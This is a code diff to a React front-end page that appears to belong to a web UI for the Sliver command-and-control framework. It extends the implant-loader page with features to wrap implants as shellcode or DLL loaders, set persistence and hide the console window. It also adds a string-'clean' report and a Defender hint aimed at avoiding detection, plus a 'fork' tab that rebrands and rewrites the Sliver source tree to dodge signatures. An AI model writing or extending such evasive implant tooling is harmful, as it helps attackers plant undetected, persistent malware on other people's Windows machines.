@@ -3,11 +3,13 @@ import { Link, useSearchParams } from 'react-router-dom'
 import { useTranslation } from 'react-i18next'
 import { api } from '../lib/api'
 import { base64ToBytes, bytesToBase64, triggerDownload } from '../lib/binary'
-import type { ImplantBuild, ImplantProfile, ShellcodeEncoderArch } from '../lib/types'
+import { matchC2Job } from '../lib/c2'
+import type { ImplantBuild, ImplantProfile, Job, ShellcodeEncoderArch } from '../lib/types'
+import C2JobStatus from '../components/C2JobStatus'
 import { useToast } from '../components/common/Toast'
 import './pages.css'
 
-type Tab = 'wrap' | 'tools' | 'stage'
+type Tab = 'wrap' | 'tools' | 'stage' | 'fork'
 
 const LS_KEY = 'sliverui-loaders-opts'
 
@@ -28,7 +30,7 @@ const DEFAULTS: SavedOpts = {
   arch: 'amd64',
   os: 'windows',
   iterations: 1,
-  functionName: '',
+  functionName: 'StartW',
   hideConsole: true,
   xorKey: '',
   persistence: 'off',
@@ -121,11 +123,14 @@ export default function LoadersPage() {
   const [params] = useSearchParams()
   const initialTab = params.get('tab')
   const [tab, setTab] = useState<Tab>(() =>
-    initialTab === 'tools' || initialTab === 'stage' || initialTab === 'wrap' ? initialTab : 'wrap',
+    initialTab === 'tools' || initialTab === 'stage' || initialTab === 'wrap' || initialTab === 'fork'
+      ? initialTab
+      : 'wrap',
   )
 
   const [builds, setBuilds] = useState<ImplantBuild[]>([])
   const [profiles, setProfiles] = useState<ImplantProfile[]>([])
+  const [jobs, setJobs] = useState<Job[]>([])
   const [encoderMap, setEncoderMap] = useState<ShellcodeEncoderArch[]>([])
   const [sourceName, setSourceName] = useState(params.get('build') || '')
   const [blobB64, setBlobB64] = useState('')
@@ -137,6 +142,27 @@ export default function LoadersPage() {
   const [opts, setOpts] = useState<SavedOpts>(loadOpts)
   const [badChars, setBadChars] = useState('')
   const [doRdi, setDoRdi] = useState(false)
+  const [forkRoot, setForkRoot] = useState('')
+  const [forkModule, setForkModule] = useState('github.com/labhost/implant')
+  const [forkBranding, setForkBranding] = useState(true)
+  const [forkProto, setForkProto] = useState(false)
+  const [forkGenerator, setForkGenerator] = useState(true)
+  const [forkReport, setForkReport] = useState<{
+    files?: number
+    dry_run?: boolean
+    hits?: Record<string, number>
+    changed?: string[]
+    next?: string[]
+    note?: string
+    needs_ui_build?: boolean
+    error?: string
+  } | null>(null)
+  const [lastClean, setLastClean] = useState<{
+    replaced?: string[]
+    remaining?: string[]
+    note?: string
+    export?: string
+  } | null>(null)
   const [stageProfile, setStageProfile] = useState(() => params.get('profile') || '')
   const [stageURL, setStageURL] = useState('tcp://0.0.0.0:8443')
   const [aesKey, setAesKey] = useState('')
@@ -157,14 +183,16 @@ export default function LoadersPage() {
 
   const refresh = useCallback(async () => {
     try {
-      const [b, p, e] = await Promise.all([
+      const [b, p, e, j] = await Promise.all([
         api.builders(),
         api.implantProfiles(),
         api.shellcodeEncoders().catch(() => ({ encoders: [] as ShellcodeEncoderArch[] })),
+        api.jobs().catch(() => ({ jobs: [] as Job[] })),
       ])
       setBuilds(b.builders || [])
       setProfiles(p.profiles || [])
       setEncoderMap(e.encoders || [])
+      setJobs(j.jobs || [])
       setError('')
     } catch (err) {
       setError((err as Error).message)
@@ -185,10 +213,12 @@ export default function LoadersPage() {
   const applyBuildMeta = useCallback((b: ImplantBuild | undefined) => {
     if (!b) return
     setDoRdi(isShared(b))
+    const exp = b.ImplantConfig?.Exports?.[0]
     setOpts((o) => ({
       ...o,
       os: normOS(b.OS || b.ImplantConfig?.OS || o.os),
       arch: normArch(b.Arch || b.ImplantConfig?.Arch || o.arch),
+      functionName: exp || o.functionName,
     }))
   }, [])
 
@@ -229,6 +259,10 @@ export default function LoadersPage() {
   )
   const sharedSource = isShared(selectedBuild)
   const outputName = outName(sourceName, opts.os)
+  const selectedC2s = selectedBuild?.ImplantConfig?.C2 || []
+  const selectedIsBeacon = Boolean(selectedBuild?.ImplantConfig?.IsBeacon)
+  const missingC2 = selectedC2s.filter((c) => c.URL && !matchC2Job(c.URL, jobs))
+  const loopbackC2 = selectedC2s.some((c) => /127\.0\.0\.1|localhost/i.test(c.URL || ''))
 
   const loadBuild = async () => {
     if (!sourceName) return
@@ -272,7 +306,7 @@ export default function LoadersPage() {
     try {
       const res = await api.shellcodeRdi({
         data_b64: blobB64,
-        function_name: opts.functionName || '',
+        function_name: opts.functionName.trim() || 'StartW',
         arguments: '',
       })
       await setBlob(res.DataB64)
@@ -330,14 +364,59 @@ export default function LoadersPage() {
         persistence: opts.persistence,
         persist_name: opts.persistName,
         xor_key: opts.xorKey.trim() || undefined,
+        function_name: opts.functionName.trim() || 'StartW',
       })
       const bin = base64ToBytes(res.data_b64)
       triggerDownload(res.filename, bin)
+      if (res.dll_data_b64 && res.dll_filename) {
+        triggerDownload(res.dll_filename, base64ToBytes(res.dll_data_b64))
+      }
       const hash = (await sha256Hex(bin)).slice(0, 16)
       toast.push(
         'success',
-        t('loaders.wrapDownloaded', { name: res.filename, size: res.size, os: res.os, arch: res.arch, hash }),
+        t('loaders.wrapDownloaded', {
+          name: res.filename,
+          size: res.size,
+          os: res.os,
+          arch: res.arch,
+          engine: res.engine || 'go',
+          hash,
+        }),
       )
+      if (res.engine === 'mingw-c-dll' && res.dll_filename) {
+        toast.push('success', t('loaders.wrapDownloadedDll', { name: res.dll_filename }))
+      }
+      setLastClean(res.clean || null)
+      if (res.clean?.remaining && res.clean.remaining.length > 0) {
+        toast.push('error', t('loaders.cleanRemaining', { count: res.clean.remaining.length }))
+      } else if (res.clean?.replaced && res.clean.replaced.length > 0) {
+        toast.push('success', t('loaders.cleanReplaced', { count: res.clean.replaced.length }))
+      }
+    } catch (err) {
+      setError((err as Error).message)
+      toast.push('error', (err as Error).message)
+    } finally {
+      setBusy(false)
+      setBusyMsg('')
+    }
+  }
+
+  const runFork = async (dryRun: boolean) => {
+    setBusy(true)
+    setBusyMsg(t('loaders.forkRunning'))
+    setError('')
+    setForkReport(null)
+    try {
+      const res = await api.forkRewrite({
+        root: forkRoot.trim(),
+        new_module: forkBranding ? forkModule.trim() : undefined,
+        branding: forkBranding,
+        proto: forkProto,
+        generator: forkGenerator,
+        dry_run: dryRun,
+      })
+      setForkReport(res)
+      toast.push('success', dryRun ? t('loaders.forkDryDone') : t('loaders.forkApplyDone'))
     } catch (err) {
       setError((err as Error).message)
       toast.push('error', (err as Error).message)
@@ -438,7 +517,7 @@ export default function LoadersPage() {
       </div>
 
       <div className="tabs" role="tablist">
-        {(['wrap', 'tools', 'stage'] as Tab[]).map((id) => (
+        {(['wrap', 'tools', 'stage', 'fork'] as Tab[]).map((id) => (
           <button
             key={id}
             type="button"
@@ -487,7 +566,20 @@ export default function LoadersPage() {
             <p className="muted">
               {t('loaders.sourceHint')} <Link to="/implants">{t('nav.implants')}</Link>
             </p>
-            {sharedSource && <p className="muted">{t('loaders.rdiAuto')}</p>}
+            {sharedSource && opts.os === 'windows' && <p className="warn-hint">{t('loaders.diskDllHint')}</p>}
+            {sharedSource && opts.os !== 'windows' && <p className="muted">{t('loaders.rdiAuto')}</p>}
+            {selectedC2s.length > 0 && (
+              <div className="c2-cell">
+                {selectedC2s.map((c) => (
+                  <div key={c.URL}>
+                    <span className="mono">{c.URL}</span> <C2JobStatus url={c.URL} jobs={jobs} />
+                  </div>
+                ))}
+              </div>
+            )}
+            {missingC2.length > 0 && <p className="warn-hint">{t('loaders.c2Missing')}</p>}
+            {loopbackC2 && <p className="warn-hint">{t('loaders.c2Loopback')}</p>}
+            {selectedIsBeacon && <p className="warn-hint">{t('loaders.beaconWatch')}</p>}
           </section>
 
           <section className="card">
@@ -529,6 +621,18 @@ export default function LoadersPage() {
               </label>
             </div>
             <p className="muted">{t('loaders.hideConsoleHint')}</p>
+            {opts.hideConsole && (
+              <div className="form-actions">
+                <button
+                  type="button"
+                  className="btn"
+                  onClick={() => setOpts((o) => ({ ...o, hideConsole: false }))}
+                >
+                  {t('loaders.labConsoleBtn')}
+                </button>
+              </div>
+            )}
+            <p className="muted">{t('loaders.labConsole')}</p>
             <label className="field">
               <span>{t('loaders.persistTitle')}</span>
               <select
@@ -585,6 +689,25 @@ export default function LoadersPage() {
             </div>
             <p className="muted">{t('loaders.wrapCompileHint')}</p>
             <p className="muted">{t('loaders.runHint')}</p>
+            <p className="muted">{t('loaders.keepAliveHint')}</p>
+            <p className="muted">{t('loaders.nativeCHint')}</p>
+            <p className="muted">{t('loaders.diskDllCopy')}</p>
+            <p className="muted">{t('loaders.cleanHint')}</p>
+            {lastClean && (lastClean.replaced?.length || lastClean.remaining?.length) ? (
+              <div className="warn-hint">
+                {lastClean.export ? <div>export {lastClean.export}</div> : null}
+                {lastClean.replaced && lastClean.replaced.length > 0 ? (
+                  <div>{t('loaders.cleanReplaced', { count: lastClean.replaced.length })}</div>
+                ) : null}
+                {lastClean.remaining && lastClean.remaining.length > 0 ? (
+                  <div>
+                    {t('loaders.cleanRemaining', { count: lastClean.remaining.length })}{' '}
+                    <span className="mono">{lastClean.remaining.slice(0, 12).join(', ')}</span>
+                  </div>
+                ) : null}
+              </div>
+            ) : null}
+            <p className="muted">{t('loaders.defenderHint')}</p>
           </section>
         </div>
       )}
@@ -637,6 +760,7 @@ export default function LoadersPage() {
                 <input
                   value={opts.functionName}
                   onChange={(e) => setOpts({ ...opts, functionName: e.target.value })}
+                  placeholder="StartW"
                 />
               </label>
             )}
@@ -747,6 +871,100 @@ export default function LoadersPage() {
               )}
               {lastKeys.rc4 && <span className="v">RC4 {lastKeys.rc4}</span>}
               <span className="k">{t('loaders.keysOnceHint')}</span>
+            </div>
+          )}
+        </section>
+      )}
+
+      {tab === 'fork' && (
+        <section className="card">
+          <h2 className="card-title">{t('loaders.forkTitle')}</h2>
+          <p className="muted">{t('loaders.forkHint')}</p>
+          <p className="warn-hint">{t('loaders.forkWarn')}</p>
+          <div className="form-grid">
+            <label className="field span-all">
+              <span>{t('loaders.forkRoot')}</span>
+              <input
+                value={forkRoot}
+                onChange={(e) => setForkRoot(e.target.value)}
+                placeholder="/home/operator/src/sliver"
+                autoComplete="off"
+              />
+            </label>
+            <label className="field span-all">
+              <span>{t('loaders.forkModule')}</span>
+              <input
+                value={forkModule}
+                onChange={(e) => setForkModule(e.target.value)}
+                autoComplete="off"
+                disabled={!forkBranding}
+              />
+            </label>
+            <div className="field check">
+              <label>
+                <input
+                  type="checkbox"
+                  checked={forkBranding}
+                  onChange={(e) => setForkBranding(e.target.checked)}
+                />
+                {t('loaders.forkBranding')}
+              </label>
+            </div>
+            <div className="field check">
+              <label>
+                <input type="checkbox" checked={forkProto} onChange={(e) => setForkProto(e.target.checked)} />
+                {t('loaders.forkProto')}
+              </label>
+            </div>
+            <div className="field check">
+              <label>
+                <input
+                  type="checkbox"
+                  checked={forkGenerator}
+                  onChange={(e) => setForkGenerator(e.target.checked)}
+                />
+                {t('loaders.forkGenerator')}
+              </label>
+            </div>
+          </div>
+          <p className="muted">{t('loaders.forkBrandingHint')}</p>
+          <p className="muted">{t('loaders.forkProtoHint')}</p>
+          <p className="muted">{t('loaders.forkGeneratorHint')}</p>
+          <p className="muted">{t('loaders.forkRotate')}</p>
+          <div className="form-actions">
+            <button
+              type="button"
+              className="btn"
+              disabled={busy || !forkRoot.trim() || (!forkBranding && !forkProto && !forkGenerator)}
+              onClick={() => void runFork(true)}
+            >
+              {t('loaders.forkDryRun')}
+            </button>
+            <button
+              type="button"
+              className="btn primary"
+              disabled={busy || !forkRoot.trim() || (!forkBranding && !forkProto && !forkGenerator)}
+              onClick={() => void runFork(false)}
+            >
+              {t('loaders.forkApply')}
+            </button>
+          </div>
+          {forkReport && (
+            <div className="warn-hint">
+              <div>{forkReport.note}</div>
+              <div>
+                files {forkReport.files ?? 0}
+                {forkReport.dry_run ? ` (${t('loaders.forkDryRun')})` : ''}
+                {forkReport.needs_ui_build ? ` · ${t('loaders.forkNeedsUI')}` : ''}
+              </div>
+              {forkReport.next?.map((n) => (
+                <div key={n} className="mono">
+                  {n}
+                </div>
+              ))}
+              {forkReport.changed && forkReport.changed.length > 0 && (
+                <div className="mono">{forkReport.changed.slice(0, 12).join(', ')}</div>
+              )}
             </div>
           )}
         </section>
